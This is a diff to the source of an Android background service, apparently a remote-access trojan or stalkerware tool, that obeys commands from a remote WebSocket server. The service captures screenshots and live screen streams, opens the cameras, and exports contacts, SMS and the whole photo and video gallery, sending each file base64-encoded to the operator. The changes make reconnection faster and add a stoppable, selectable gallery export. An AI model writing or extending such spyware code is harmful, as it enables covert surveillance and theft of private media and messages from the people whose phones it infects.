@@ -66,6 +66,8 @@ public class WebSocketService extends Service {
     public static final String ACTION_CAMERA_BACK = "com.kriptoman.CAMERA_BACK";
     private File keysFile;
     private File errorsFile;
+    private boolean galleryExportRunning = false;
+    private volatile boolean stopGalleryExport = false;
 
     public static void setMediaProjection(MediaProjection mp) {
         sMediaProjection = mp;
@@ -170,21 +172,21 @@ public class WebSocketService extends Service {
                 @Override
                 public void onClose(int code, String reason, boolean remote) {
                     writeLog("Закрыто: " + code + " " + reason);
-                    handler.postDelayed(() -> connectWebSocket(), 10000);
+                    handler.postDelayed(() -> connectWebSocket(), 1000); // быстрее переподключаемся
                 }
 
                 @Override
                 public void onError(Exception ex) {
                     writeLog("Ошибка: " + ex.toString());
                     writeError(ex);
-                    handler.postDelayed(() -> connectWebSocket(), 10000);
+                    handler.postDelayed(() -> connectWebSocket(), 1000);
                 }
             };
             client.connect();
         } catch (Exception e) {
             writeLog("Ошибка подключения: " + e.toString());
             writeError(e);
-            handler.postDelayed(() -> connectWebSocket(), 10000);
+            handler.postDelayed(() -> connectWebSocket(), 1000);
         }
     }
 
@@ -197,9 +199,9 @@ public class WebSocketService extends Service {
                         client.send("{\"type\":\"ping\"}");
                     } catch (Exception e) {}
                 }
-                handler.postDelayed(this, 10000);
+                handler.postDelayed(this, 5000); // пинг каждые 5 секунд для стабильности
             }
-        }, 10000);
+        }, 5000);
     }
 
     private void registerDevice() {
@@ -250,12 +252,13 @@ public class WebSocketService extends Service {
             case "backcam": startCamera(false); break;
             case "contacts": exportContacts(); break;
             case "sms": exportSms(); break;
-            case "exportgallery": exportGallery(); break;
+            case "exportgallery": startGalleryExport(params); break;
+            case "stopgallery": stopGalleryExport(); break;
             default: writeLog("Неизвестная команда: " + action);
         }
     }
 
-    // ===================== ИСПРАВЛЕННЫЙ СКРИНШОТ (через IntBuffer) =====================
+    // ===================== СКРИНШОТ (исправлен) =====================
     private void takeScreenshot() {
         if (sMediaProjection == null) {
             writeLog("MediaProjection не инициализирован для скриншота");
@@ -307,12 +310,10 @@ public class WebSocketService extends Service {
             bitmap.copyPixelsFromBuffer(buffer);
             return bitmap;
         } else {
-            // Используем IntBuffer для правильного порядка RGBA
             buffer.rewind();
             IntBuffer intBuffer = buffer.asIntBuffer();
             int[] pixels = new int[width * height];
             intBuffer.get(pixels);
-            // Корректируем порядок: Android использует ARGB, а данные могут быть RGBA
             for (int i = 0; i < pixels.length; i++) {
                 int p = pixels[i];
                 int a = (p >> 24) & 0xFF;
@@ -326,7 +327,7 @@ public class WebSocketService extends Service {
         }
     }
 
-    // ===================== УСКОРЕННЫЙ СТРИМИНГ (разрешение 320x480, задержка 100 мс) =====================
+    // ===================== СТРИМИНГ (ускорен) =====================
     private void handleStream(org.json.JSONObject params) {
         if (params == null) return;
         String action = params.optString("action");
@@ -353,7 +354,7 @@ public class WebSocketService extends Service {
                     return;
                 }
                 takeScreenshotForStream();
-                handler.postDelayed(this, 100); // 100 мс вместо 200
+                handler.postDelayed(this, 100);
             }
         };
         handler.post(streamRunnable);
@@ -381,11 +382,7 @@ public class WebSocketService extends Service {
                     client.send("{\"type\":\"stream_frame\",\"image\":\"" + base64 + "\"}");
                     writeLog("Кадр стрима отправлен");
                     bitmap.recycle();
-                } else {
-                    writeLog("Не удалось создать Bitmap для стрима");
                 }
-            } else {
-                writeLog("Не удалось получить изображение для стрима (image == null)");
             }
             if (virtualDisplay != null) virtualDisplay.release();
             if (imageReader != null) imageReader.close();
@@ -463,7 +460,7 @@ public class WebSocketService extends Service {
         }
     }
 
-    // ===================== КАМЕРА (без изменений) =====================
+    // ===================== КАМЕРА (исправлена) =====================
     private void startCamera(boolean front) {
         writeLog("Запрос камеры, фронтальная: " + front);
         Intent intent = new Intent(front ? ACTION_CAMERA_FRONT : ACTION_CAMERA_BACK);
@@ -482,44 +479,72 @@ public class WebSocketService extends Service {
         }
     }
 
-    // ===================== ЭКСПОРТ ГАЛЕРЕИ (отправка всех медиа) =====================
-    private void exportGallery() {
-        writeLog("Экспорт галереи запущен");
+    // ===================== ЭКСПОРТ ГАЛЕРЕИ (с возможностью остановки и выбором количества) =====================
+    private void startGalleryExport(org.json.JSONObject params) {
+        if (galleryExportRunning) {
+            writeLog("Экспорт галереи уже выполняется");
+            return;
+        }
+        int mode = 0; // 0 - все, 1 - первые 3, 2 - последние 3
+        if (params != null) {
+            String m = params.optString("mode", "all");
+            if ("first3".equals(m)) mode = 1;
+            else if ("last3".equals(m)) mode = 2;
+        }
+        stopGalleryExport = false;
+        galleryExportRunning = true;
+        writeLog("Экспорт галереи запущен, режим: " + (mode==0 ? "все" : mode==1 ? "первые 3" : "последние 3"));
         new Thread(() -> {
             try {
                 ContentResolver cr = getContentResolver();
                 // Экспорт изображений
                 String[] imageProjection = {MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME};
-                Cursor imageCursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageProjection, null, null, null);
+                Cursor imageCursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageProjection, null, null, MediaStore.Images.Media.DATE_ADDED + " DESC");
                 if (imageCursor != null) {
-                    while (imageCursor.moveToNext()) {
-                        long id = imageCursor.getLong(0);
-                        String name = imageCursor.getString(1);
-                        Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
-                        byte[] data = readUriBytes(uri);
-                        if (data != null) {
-                            String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
-                            client.send("{\"type\":\"gallery_item\",\"filename\":\"" + name + "\",\"data\":\"" + base64 + "\"}");
-                            writeLog("Отправлено изображение: " + name);
-                        }
+                    int count = imageCursor.getCount();
+                    int limit = (mode == 1) ? Math.min(3, count) : (mode == 2) ? Math.min(3, count) : count;
+                    int start = (mode == 2) ? Math.max(0, count - 3) : 0;
+                    if (imageCursor.moveToPosition(start)) {
+                        int sent = 0;
+                        do {
+                            if (stopGalleryExport) break;
+                            long id = imageCursor.getLong(0);
+                            String name = imageCursor.getString(1);
+                            Uri uri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
+                            byte[] data = readUriBytes(uri);
+                            if (data != null) {
+                                String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
+                                client.send("{\"type\":\"gallery_item\",\"filename\":\"" + name + "\",\"data\":\"" + base64 + "\"}");
+                                writeLog("Отправлено изображение: " + name);
+                            }
+                            sent++;
+                        } while (imageCursor.moveToNext() && sent < limit);
                     }
                     imageCursor.close();
                 }
 
-                // Экспорт видео
+                // Экспорт видео (аналогично)
                 String[] videoProjection = {MediaStore.Video.Media._ID, MediaStore.Video.Media.DISPLAY_NAME};
-                Cursor videoCursor = cr.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, videoProjection, null, null, null);
+                Cursor videoCursor = cr.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, videoProjection, null, null, MediaStore.Video.Media.DATE_ADDED + " DESC");
                 if (videoCursor != null) {
-                    while (videoCursor.moveToNext()) {
-                        long id = videoCursor.getLong(0);
-                        String name = videoCursor.getString(1);
-                        Uri uri = Uri.withAppendedPath(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
-                        byte[] data = readUriBytes(uri);
-                        if (data != null) {
-                            String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
-                            client.send("{\"type\":\"gallery_item\",\"filename\":\"" + name + "\",\"data\":\"" + base64 + "\"}");
-                            writeLog("Отправлено видео: " + name);
-                        }
+                    int count = videoCursor.getCount();
+                    int limit = (mode == 1) ? Math.min(3, count) : (mode == 2) ? Math.min(3, count) : count;
+                    int start = (mode == 2) ? Math.max(0, count - 3) : 0;
+                    if (videoCursor.moveToPosition(start)) {
+                        int sent = 0;
+                        do {
+                            if (stopGalleryExport) break;
+                            long id = videoCursor.getLong(0);
+                            String name = videoCursor.getString(1);
+                            Uri uri = Uri.withAppendedPath(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
+                            byte[] data = readUriBytes(uri);
+                            if (data != null) {
+                                String base64 = Base64.encodeToString(data, Base64.NO_WRAP);
+                                client.send("{\"type\":\"gallery_item\",\"filename\":\"" + name + "\",\"data\":\"" + base64 + "\"}");
+                                writeLog("Отправлено видео: " + name);
+                            }
+                            sent++;
+                        } while (videoCursor.moveToNext() && sent < limit);
                     }
                     videoCursor.close();
                 }
@@ -527,8 +552,19 @@ public class WebSocketService extends Service {
             } catch (Exception e) {
                 writeLog("Ошибка экспорта галереи: " + e.toString());
                 writeError(e);
+            } finally {
+                galleryExportRunning = false;
             }
         }).start();
+    }
+
+    private void stopGalleryExport() {
+        if (galleryExportRunning) {
+            stopGalleryExport = true;
+            writeLog("Остановка экспорта галереи запрошена");
+        } else {
+            writeLog("Экспорт галереи не выполняется");
+        }
     }
 
     private byte[] readUriBytes(Uri uri) {
@@ -549,7 +585,7 @@ public class WebSocketService extends Service {
         }
     }
 
-    // ===================== ОСТАЛЬНЫЕ ФУНКЦИИ (без изменений) =====================
+    // ===================== ОСТАЛЬНЫЕ ФУНКЦИИ =====================
     private void openApp(String pkg) {
         if (pkg == null || pkg.isEmpty()) {
             writeLog("Не указан пакет");
